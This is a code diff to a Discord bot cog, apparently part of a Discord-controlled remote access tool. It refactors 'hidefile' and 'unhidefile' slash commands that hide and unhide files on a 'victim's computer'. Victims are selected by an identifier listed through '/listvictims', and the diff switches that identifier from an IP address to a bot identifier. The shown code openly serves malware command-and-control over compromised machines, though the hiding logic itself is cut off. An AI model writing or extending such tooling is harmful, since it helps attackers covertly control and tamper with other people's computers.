@@ -10,15 +10,16 @@ class Hide(commands.Cog):
         self.bot = bot
         self.ip_addr = self.bot.ip_addr
         
-    @commands.slash_command(
-        description="Hide file on victim's computer",
-        options=[
-            bot.victim,
-            discord.Option("file", description="File path of the file to be hidden", required=True),
-        ],
-    )
+    @commands.slash_command( )
     async def hidefile(self, ctx, victim, file):
-        if str(victim) == str(self.ip_addr): 
+        """Hide any file on victim's computer
+
+        Parameters
+        ----------
+        victim: Identifier of the affected computer (found via /listvictims).
+        file: File path of the file to be hidden.
+        """
+        if str(victim) == str(self.bot.identifier): 
             if '"' in file:
                 file = file.replace('"','')
                 
@@ -40,15 +41,18 @@ class Hide(commands.Cog):
                     "Path:\n```"+file+"```"
                 )
             )                        
-    @commands.slash_command(
-        description="Unhide file on victim's computer",
-        options=[
-            bot.victim,
-            discord.Option("file", description="File path of the file to be unhidden", required=True),
-        ],
-    )
+
+    @commands.slash_command( )
     async def unhidefile(self, ctx, victim, file):
-        if str(victim) == str(self.ip_addr): 
+        """Unhide hidden file on victim's computer
+
+        Parameters
+        ----------
+        victim: Identifier of the affected computer (found via /listvictims).
+        file: File path of the file to be unhidden.
+        """
+        if str(victim) == str(self.bot.identifier): 
+
             if '"' in file:
                 file = file.replace('"','')
                 
